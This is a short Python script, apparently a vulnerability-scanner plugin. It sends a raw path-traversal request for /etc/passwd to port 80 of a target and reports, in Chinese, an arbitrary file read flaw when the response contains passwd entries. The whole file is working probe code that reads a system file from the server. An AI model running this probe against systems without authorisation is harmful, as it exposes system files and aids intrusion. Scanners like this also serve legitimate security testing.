import socket


def do(target):
    port = 80
    try:
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, int(port)))
        flag = b"GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if b'root:' in data and b'nobody:' in data:
            return True, "存在WebServer任意文件读取漏洞"
    except:
        pass
    return False, ''
